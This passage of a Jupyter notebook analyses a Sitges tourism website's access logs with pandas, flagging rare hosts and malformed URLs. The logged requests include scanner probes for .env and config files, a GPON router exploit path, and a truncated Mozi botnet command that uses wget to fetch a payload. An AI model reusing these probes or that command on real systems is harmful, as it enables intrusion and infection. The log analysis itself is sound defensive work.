       "      <td>Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKi...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>647673</th>\n",
       "      <td>51366</td>\n",
       "      <td>_mta-sts.sitgesfilmoffice.cat</td>\n",
       "      <td>205.210.31.216</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-26 09:09:12+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/ HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>537</td>\n",
       "      <td>-</td>\n",
       "      <td>Expanse, a Palo Alto Networks company, searche...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>713993</th>\n",
       "      <td>117686</td>\n",
       "      <td>185.36.81.42</td>\n",
       "      <td>185.36.81.42</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-26 20:03:21+01:00</td>\n",
       "      <td>CONNECT</td>\n",
       "      <td>185.36.81.42:443 HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>537</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>714253</th>\n",
       "      <td>117946</td>\n",
       "      <td>185.36.81.42</td>\n",
       "      <td>185.36.81.42</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-26 20:06:15+01:00</td>\n",
       "      <td>CONNECT</td>\n",
       "      <td>185.36.81.42:443 HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>537</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>730787</th>\n",
       "      <td>134480</td>\n",
       "      <td>5.188.210.227</td>\n",
       "      <td>5.188.210.227</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-26 21:58:12+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>http://5.188.210.227/echo.php HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>552</td>\n",
       "      <td>https://www.google.com/</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.3...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>734424</th>\n",
       "      <td>138117</td>\n",
       "      <td>admin.sitgesfilmoffice.com</td>\n",
       "      <td>205.210.31.192</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-26 22:57:49+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/ HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>537</td>\n",
       "      <td>-</td>\n",
       "      <td>Expanse, a Palo Alto Networks company, searche...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>782678</th>\n",
       "      <td>42641</td>\n",
       "      <td>_mta-sts.sitgesfilmoffice.cat</td>\n",
       "      <td>205.210.31.35</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-27 09:03:25+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/ HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>537</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>793362</th>\n",
       "      <td>53325</td>\n",
       "      <td>admin.sitgesfilmoffice.com</td>\n",
       "      <td>205.210.31.199</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-27 10:14:28+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/ HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>6152</td>\n",
       "      <td>-</td>\n",
       "      <td>Expanse, a Palo Alto Networks company, searche...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>798468</th>\n",
       "      <td>58431</td>\n",
       "      <td>mail.sitgesfilmoffice.com</td>\n",
       "      <td>205.210.31.176</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-27 10:56:12+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/ HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>6152</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>803231</th>\n",
       "      <td>63194</td>\n",
       "      <td>0.0.0.0</td>\n",
       "      <td>184.154.39.30</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-27 12:13:29+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/ HTTP/1.0</td>\n",
       "      <td>301</td>\n",
       "      <td>5648</td>\n",
       "      <td>-</td>\n",
       "      <td>nvdorz</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>834520</th>\n",
       "      <td>94483</td>\n",
       "      <td>_mta-sts.sitgesfilmoffice.cat</td>\n",
       "      <td>198.235.24.172</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-27 16:10:28+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/ HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>6152</td>\n",
       "      <td>-</td>\n",
       "      <td>Expanse, a Palo Alto Networks company, searche...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>870388</th>\n",
       "      <td>130351</td>\n",
       "      <td>admin.sitgesfilmoffice.com</td>\n",
       "      <td>205.210.31.15</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-27 20:39:15+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/ HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>537</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>871853</th>\n",
       "      <td>131816</td>\n",
       "      <td>mail.sitgesfilmoffice.com</td>\n",
       "      <td>205.210.31.24</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-27 20:58:31+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/ HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>537</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>940959</th>\n",
       "      <td>51108</td>\n",
       "      <td>sitemap.sitgesfilmoffice.es</td>\n",
       "      <td>52.167.144.67</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-28 09:52:26+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/robots.txt HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>591</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Ge...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>940961</th>\n",
       "      <td>51110</td>\n",
       "      <td>sitemap.sitgesfilmoffice.es</td>\n",
       "      <td>52.167.144.67</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-28 09:52:26+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/ca/robots.txt HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>674</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Ge...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>947440</th>\n",
       "      <td>57589</td>\n",
       "      <td>ftp.sitgestur.net</td>\n",
       "      <td>71.6.134.235</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-28 11:02:41+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/ HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>6152</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>951744</th>\n",
       "      <td>61893</td>\n",
       "      <td>admin.sitgesfilmoffice.com</td>\n",
       "      <td>205.210.31.32</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-28 12:00:19+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/ HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>6152</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>973422</th>\n",
       "      <td>83571</td>\n",
       "      <td>api.csgoroll.com</td>\n",
       "      <td>91.121.216.109</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-28 15:44:19+01:00</td>\n",
       "      <td>HEAD</td>\n",
       "      <td>/ HTTP/2.0</td>\n",
       "      <td>301</td>\n",
       "      <td>295</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>980090</th>\n",
       "      <td>90239</td>\n",
       "      <td>_mta-sts.sitgesfilmoffice.cat</td>\n",
       "      <td>205.210.31.26</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-28 17:40:41+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/ HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>6152</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1004173</th>\n",
       "      <td>114322</td>\n",
       "      <td>ftp.sitgestur.info</td>\n",
       "      <td>71.6.134.233</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-28 20:59:09+01:00</td>\n",
       "      <td>GET</td>\n",
       "      <td>/ HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>6152</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1008679</th>\n",
       "      <td>118828</td>\n",
       "      <td>api6.ipify.org</td>\n",
       "      <td>91.92.245.67</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-28 21:50:34+01:00</td>\n",
       "      <td>CONNECT</td>\n",
       "      <td>api6.ipify.org:443 HTTP/1.1</td>\n",
       "      <td>301</td>\n",
       "      <td>537</td>\n",
       "      <td>-</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...</td>\n",
       "      <td>0</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "         Unnamed: 0                    server_name               IP logname  \\\n",
       "35726         35726             ftp.sitgestur.info     71.6.134.231       -   \n",
       "128416       128416      mail.sitgesfilmoffice.com   198.235.24.180       -   \n",
       "185895         3361                     google.com    66.45.237.154       -   \n",
       "207529        24995                      127.0.0.1  123.129.135.123       -   \n",
       "215969        33435      mail.sitgesfilmoffice.com    139.59.191.17       -   \n",
       "215970        33436      mail.sitgesfilmoffice.com    139.59.191.17       -   \n",
       "267271        84737  _mta-sts.sitgesfilmoffice.cat    205.210.31.99       -   \n",
       "320536         4972                        0.0.0.0    31.220.88.155       -   \n",
       "331850        16286                     google.com    66.45.237.154       -   \n",
       "338963        23399          _dmarc.bestsitges.net    205.210.31.70       -   \n",
       "344441        28877          _dmarc.bestsitges.net   205.210.31.173       -   \n",
       "358081        42517  _mta-sts.sitgesfilmoffice.cat   205.210.31.223       -   \n",
       "359015        43451      smtp.sitgesfilmoffice.com   198.235.24.170       -   \n",
       "407147        91583      mail.sitgesfilmoffice.com   198.235.24.150       -   \n",
       "471766        20793                        0.0.0.0    96.43.128.186       -   \n",
       "523909        72936                        0.0.0.0   102.131.60.136       -   \n",
       "529619        78646       app.sitgesfilmoffice.cat    79.124.59.162       -   \n",
       "529623        78650       app.sitgesfilmoffice.cat    79.124.59.162       -   \n",
       "529624        78651       app.sitgesfilmoffice.cat    79.124.59.162       -   \n",
       "529625        78652       app.sitgesfilmoffice.cat    79.124.59.162       -   \n",
       "529626        78653       app.sitgesfilmoffice.cat    79.124.59.162       -   \n",
       "529635        78662       app.sitgesfilmoffice.cat    79.124.59.162       -   \n",
       "529636        78663       app.sitgesfilmoffice.cat    79.124.59.162       -   \n",
       "567751       116778     admin.sitgesfilmoffice.cat   183.136.225.45       -   \n",
       "567754       116781     admin.sitgesfilmoffice.cat   183.136.225.45       -   \n",
       "567759       116786     admin.sitgesfilmoffice.cat   183.136.225.45       -   \n",
       "647673        51366  _mta-sts.sitgesfilmoffice.cat   205.210.31.216       -   \n",
       "713993       117686                   185.36.81.42     185.36.81.42       -   \n",
       "714253       117946                   185.36.81.42     185.36.81.42       -   \n",
       "730787       134480                  5.188.210.227    5.188.210.227       -   \n",
       "734424       138117     admin.sitgesfilmoffice.com   205.210.31.192       -   \n",
       "782678        42641  _mta-sts.sitgesfilmoffice.cat    205.210.31.35       -   \n",
       "793362        53325     admin.sitgesfilmoffice.com   205.210.31.199       -   \n",
       "798468        58431      mail.sitgesfilmoffice.com   205.210.31.176       -   \n",
       "803231        63194                        0.0.0.0    184.154.39.30       -   \n",
       "834520        94483  _mta-sts.sitgesfilmoffice.cat   198.235.24.172       -   \n",
       "870388       130351     admin.sitgesfilmoffice.com    205.210.31.15       -   \n",
       "871853       131816      mail.sitgesfilmoffice.com    205.210.31.24       -   \n",
       "940959        51108    sitemap.sitgesfilmoffice.es    52.167.144.67       -   \n",
       "940961        51110    sitemap.sitgesfilmoffice.es    52.167.144.67       -   \n",
       "947440        57589              ftp.sitgestur.net     71.6.134.235       -   \n",
       "951744        61893     admin.sitgesfilmoffice.com    205.210.31.32       -   \n",
       "973422        83571               api.csgoroll.com   91.121.216.109       -   \n",
       "980090        90239  _mta-sts.sitgesfilmoffice.cat    205.210.31.26       -   \n",
       "1004173      114322             ftp.sitgestur.info     71.6.134.233       -   \n",
       "1008679      118828                 api6.ipify.org     91.92.245.67       -   \n",
       "\n",
       "        authenticate                       date petition  \\\n",
       "35726              -  2024-01-22 06:38:32+01:00      GET   \n",
       "128416             -  2024-01-22 17:21:03+01:00      GET   \n",
       "185895             -  2024-01-23 00:38:41+01:00  CONNECT   \n",
       "207529             -  2024-01-23 04:57:44+01:00     POST   \n",
       "215969             -  2024-01-23 06:54:40+01:00      GET   \n",
       "215970             -  2024-01-23 06:54:40+01:00      GET   \n",
       "267271             -  2024-01-23 15:17:35+01:00      GET   \n",
       "320536             -  2024-01-24 00:39:29+01:00      GET   \n",
       "331850             -  2024-01-24 02:40:44+01:00  CONNECT   \n",
       "338963             -  2024-01-24 03:49:51+01:00      GET   \n",
       "344441             -  2024-01-24 06:05:17+01:00      GET   \n",
       "358081             -  2024-01-24 08:11:24+01:00      GET   \n",
       "359015             -  2024-01-24 08:42:05+01:00      GET   \n",
       "407147             -  2024-01-24 17:14:59+01:00      GET   \n",
       "471766             -  2024-01-25 05:09:38+01:00      GET   \n",
       "523909             -  2024-01-25 13:17:01+01:00      GET   \n",
       "529619             -  2024-01-25 14:04:47+01:00      GET   \n",
       "529623             -  2024-01-25 14:04:49+01:00      GET   \n",
       "529624             -  2024-01-25 14:04:49+01:00      GET   \n",
       "529625             -  2024-01-25 14:04:50+01:00      GET   \n",
       "529626             -  2024-01-25 14:04:50+01:00      GET   \n",
       "529635             -  2024-01-25 14:04:51+01:00      GET   \n",
       "529636             -  2024-01-25 14:04:51+01:00      GET   \n",
       "567751             -  2024-01-25 19:45:28+01:00      GET   \n",
       "567754             -  2024-01-25 19:45:40+01:00      GET   \n",
       "567759             -  2024-01-25 19:45:45+01:00      GET   \n",
       "647673             -  2024-01-26 09:09:12+01:00      GET   \n",
       "713993             -  2024-01-26 20:03:21+01:00  CONNECT   \n",
       "714253             -  2024-01-26 20:06:15+01:00  CONNECT   \n",
       "730787             -  2024-01-26 21:58:12+01:00      GET   \n",
       "734424             -  2024-01-26 22:57:49+01:00      GET   \n",
       "782678             -  2024-01-27 09:03:25+01:00      GET   \n",
       "793362             -  2024-01-27 10:14:28+01:00      GET   \n",
       "798468             -  2024-01-27 10:56:12+01:00      GET   \n",
       "803231             -  2024-01-27 12:13:29+01:00      GET   \n",
       "834520             -  2024-01-27 16:10:28+01:00      GET   \n",
       "870388             -  2024-01-27 20:39:15+01:00      GET   \n",
       "871853             -  2024-01-27 20:58:31+01:00      GET   \n",
       "940959             -  2024-01-28 09:52:26+01:00      GET   \n",
       "940961             -  2024-01-28 09:52:26+01:00      GET   \n",
       "947440             -  2024-01-28 11:02:41+01:00      GET   \n",
       "951744             -  2024-01-28 12:00:19+01:00      GET   \n",
       "973422             -  2024-01-28 15:44:19+01:00     HEAD   \n",
       "980090             -  2024-01-28 17:40:41+01:00      GET   \n",
       "1004173            -  2024-01-28 20:59:09+01:00      GET   \n",
       "1008679            -  2024-01-28 21:50:34+01:00  CONNECT   \n",
       "\n",
       "                                              URL  status  bytes  \\\n",
       "35726                                  / HTTP/1.1     301   6152   \n",
       "128416                                 / HTTP/1.1     301    537   \n",
       "185895                    google.com:443 HTTP/1.1     301    537   \n",
       "207529       /GponForm/diag_Form?images/ HTTP/1.1     301    599   \n",
       "215969                                 / HTTP/1.1     301    537   \n",
       "215970                                 / HTTP/1.1     301   5641   \n",
       "267271                                 / HTTP/1.1     301   6152   \n",
       "320536                 /admin/config.php HTTP/1.0     301   5664   \n",
       "331850                    google.com:443 HTTP/1.1     301    537   \n",
       "338963                                 / HTTP/1.1     301   6152   \n",
       "344441                                 / HTTP/1.1     301    537   \n",
       "358081                                 / HTTP/1.1     301    537   \n",
       "359015                                 / HTTP/1.1     301   6152   \n",
       "407147                                 / HTTP/1.1     301   6152   \n",
       "471766   /api/v2/cmdb/system/admin/admin HTTP/1.0     301   5678   \n",
       "523909                                 / HTTP/1.0     301   5648   \n",
       "529619                             /.env HTTP/1.1     301    541   \n",
       "529623                     /sendgrid.env HTTP/1.1     301    485   \n",
       "529624                  /en/sendgrid.env HTTP/1.1     404   2598   \n",
       "529625                      /config.json HTTP/1.1     301    484   \n",
       "529626                   /en/config.json HTTP/1.1     404   2598   \n",
       "529635                         /api/.env HTTP/1.1     301    481   \n",
       "529636                      /en/api/.env HTTP/1.1     404   2598   \n",
       "567751                                 / HTTP/1.1     301   5276   \n",
       "567754                              /ca/ HTTP/1.1     200  17946   \n",
       "567759                       /robots.txt HTTP/1.1     301   6169   \n",
       "647673                                 / HTTP/1.1     301    537   \n",
       "713993                  185.36.81.42:443 HTTP/1.1     301    537   \n",
       "714253                  185.36.81.42:443 HTTP/1.1     301    537   \n",
       "730787     http://5.188.210.227/echo.php HTTP/1.1     301    552   \n",
       "734424                                 / HTTP/1.1     301    537   \n",
       "782678                                 / HTTP/1.1     301    537   \n",
       "793362                                 / HTTP/1.1     301   6152   \n",
       "798468                                 / HTTP/1.1     301   6152   \n",
       "803231                                 / HTTP/1.0     301   5648   \n",
       "834520                                 / HTTP/1.1     301   6152   \n",
       "870388                                 / HTTP/1.1     301    537   \n",
       "871853                                 / HTTP/1.1     301    537   \n",
       "940959                       /robots.txt HTTP/1.1     301    591   \n",
       "940961                    /ca/robots.txt HTTP/1.1     200    674   \n",
       "947440                                 / HTTP/1.1     301   6152   \n",
       "951744                                 / HTTP/1.1     301   6152   \n",
       "973422                                 / HTTP/2.0     301    295   \n",
       "980090                                 / HTTP/1.1     301   6152   \n",
       "1004173                                / HTTP/1.1     301   6152   \n",
       "1008679               api6.ipify.org:443 HTTP/1.1     301    537   \n",
       "\n",
       "                                              referer  \\\n",
       "35726                                               -   \n",
       "128416                                              -   \n",
       "185895                                              -   \n",
       "207529                                              -   \n",
       "215969                                              -   \n",
       "215970                                              -   \n",
       "267271                                              -   \n",
       "320536                                              -   \n",
       "331850                                              -   \n",
       "338963                                              -   \n",
       "344441                                              -   \n",
       "358081                                              -   \n",
       "359015                                              -   \n",
       "407147                                              -   \n",
       "471766                                              -   \n",
       "523909                                              -   \n",
       "529619                                              -   \n",
       "529623                                              -   \n",
       "529624   http://app.sitgesfilmoffice.cat/sendgrid.env   \n",
       "529625                                              -   \n",
       "529626    http://app.sitgesfilmoffice.cat/config.json   \n",
       "529635                                              -   \n",
       "529636       http://app.sitgesfilmoffice.cat/api/.env   \n",
       "567751                                              -   \n",
       "567754                                              -   \n",
       "567759                                              -   \n",
       "647673                                              -   \n",
       "713993                                              -   \n",
       "714253                                              -   \n",
       "730787                        https://www.google.com/   \n",
       "734424                                              -   \n",
       "782678                                              -   \n",
       "793362                                              -   \n",
       "798468                                              -   \n",
       "803231                                              -   \n",
       "834520                                              -   \n",
       "870388                                              -   \n",
       "871853                                              -   \n",
       "940959                                              -   \n",
       "940961                                              -   \n",
       "947440                                              -   \n",
       "951744                                              -   \n",
       "973422                                              -   \n",
       "980090                                              -   \n",
       "1004173                                             -   \n",
       "1008679                                             -   \n",
       "\n",
       "                                                user-agent  level  \n",
       "35726    Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...      0  \n",
       "128416                                                   -      0  \n",
       "185895                                  Go-http-client/1.1      0  \n",
       "207529                                        Hello, World      3  \n",
       "215969   Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/53...      0  \n",
       "215970   Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/53...      0  \n",
       "267271   Expanse, a Palo Alto Networks company, searche...      0  \n",
       "320536                                                xfa1      0  \n",
       "331850                                  Go-http-client/1.1      0  \n",
       "338963   Expanse, a Palo Alto Networks company, searche...      0  \n",
       "344441   Expanse, a Palo Alto Networks company, searche...      0  \n",
       "358081   Expanse, a Palo Alto Networks company, searche...      0  \n",
       "359015   Expanse, a Palo Alto Networks company, searche...      0  \n",
       "407147   Expanse, a Palo Alto Networks company, searche...      0  \n",
       "471766                                       Report Runner      0  \n",
       "523909                                              nvdorz      0  \n",
       "529619   Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKi...      0  \n",
       "529623   Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3)...      0  \n",
       "529624   Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3)...      5  \n",
       "529625   Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...      0  \n",
       "529626   Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...      5  \n",
       "529635   Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.3...      0  \n",
       "529636   Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.3...      5  \n",
       "567751   Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.3...      0  \n",
       "567754   Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKi...      0  \n",
       "567759   Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKi...      0  \n",
       "647673   Expanse, a Palo Alto Networks company, searche...      0  \n",
       "713993                                                   -      0  \n",
       "714253                                                   -      0  \n",
       "730787   Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.3...      0  \n",
       "734424   Expanse, a Palo Alto Networks company, searche...      0  \n",
       "782678                                                   -      0  \n",
       "793362   Expanse, a Palo Alto Networks company, searche...      0  \n",
       "798468                                                   -      0  \n",
       "803231                                              nvdorz      0  \n",
       "834520   Expanse, a Palo Alto Networks company, searche...      0  \n",
       "870388                                                   -      0  \n",
       "871853                                                   -      0  \n",
       "940959   Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Ge...      0  \n",
       "940961   Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Ge...      0  \n",
       "947440   Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...      0  \n",
       "951744                                                   -      0  \n",
       "973422                                                   -      0  \n",
       "980090                                                   -      0  \n",
       "1004173  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...      0  \n",
       "1008679  Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...      0  "
      ]
     },
     "execution_count": 31,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "server_names, counts = df[\"server_name\"].value_counts().index, df[\"server_name\"].value_counts().values\n",
    "rare = {server_name: count for server_name, count in zip(server_names, counts) if count < 10}\n",
    "df[df[\"server_name\"].isin(rare.keys())]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## URL"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "('www.sitgesanytime.com',\n",
       " '/fr/pag492/explora-platges-i-ports-2/id12/les-anquines.htm',\n",
       " 'HTTP/1.1')"
      ]
     },
     "execution_count": 32,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "ex = df.iloc[1]\n",
    "server_name = ex[\"server_name\"]\n",
    "url, http_version = ex[\"URL\"].split(\" \")\n",
    "server_name, url, http_version"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'HTTP/1.1': 69449, 'HTTP/2.0': 25303, 'HTTP/1.0': 158}"
      ]
     },
     "execution_count": 47,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "counts = pd.Series([str(u).split(\" \")[-1] for u in df[\"URL\"].unique()]).value_counts()\n",
    "{url: count for url, count in counts.items() if count > 1}"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "['\\\\x16\\\\x03\\\\x01\\\\x01\\\\b\\\\x01',\n",
       " '\\\\x16\\\\x03\\\\x01\\\\x01\\\\xc0\\\\x01',\n",
       " '\\\\x15\\\\b\\\\xceo\\\\x10X\\\\x85b`\\\\x11\\\\x04\\\\xb0V\\\\xf7',\n",
       " '12.1.2\\\\n',\n",
       " '\\\\n']"
      ]
     },
     "execution_count": 51,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "[url for url, count in counts.items() if count <= 1][:5]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 101,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "level\n",
       "-1    432\n",
       "Name: count, dtype: int64"
      ]
     },
     "execution_count": 101,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "have_rare_url = ~df[\"URL\"].str.endswith((\"HTTP/1.0\", \"HTTP/1.1\", \"HTTP/2.0\")).astype(bool)\n",
    "df[have_rare_url][\"level\"].value_counts()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 102,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "435"
      ]
     },
     "execution_count": 102,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "dict(df[\"level\"].value_counts().items())[-1]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 113,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "/tmp/ipykernel_28172/3341498777.py:1: UserWarning: Boolean Series key will be reindexed to match DataFrame index.\n",
      "  df[df[\"level\"]==-1][~have_rare_url]\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Unnamed: 0</th>\n",
       "      <th>server_name</th>\n",
       "      <th>IP</th>\n",
       "      <th>logname</th>\n",
       "      <th>authenticate</th>\n",
       "      <th>date</th>\n",
       "      <th>petition</th>\n",
       "      <th>URL</th>\n",
       "      <th>status</th>\n",
       "      <th>bytes</th>\n",
       "      <th>referer</th>\n",
       "      <th>user-agent</th>\n",
       "      <th>level</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>189855</th>\n",
       "      <td>7321</td>\n",
       "      <td>www.sitgesanytime.com</td>\n",
       "      <td>117.235.37.51</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-23 01:11:33+01:00</td>\n",
       "      <td>-</td>\n",
       "      <td>27;wget%20http://%s:%d/Mozi.m%20-O%20-&gt;%20/tmp...</td>\n",
       "      <td>400</td>\n",
       "      <td>421</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>-1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1052503</th>\n",
       "      <td>33499</td>\n",
       "      <td>www.sitgesanytime.com</td>\n",
       "      <td>18.133.77.205</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>2024-01-29 07:31:58+01:00</td>\n",
       "      <td>-</td>\n",
       "      <td>NaN</td>\n",
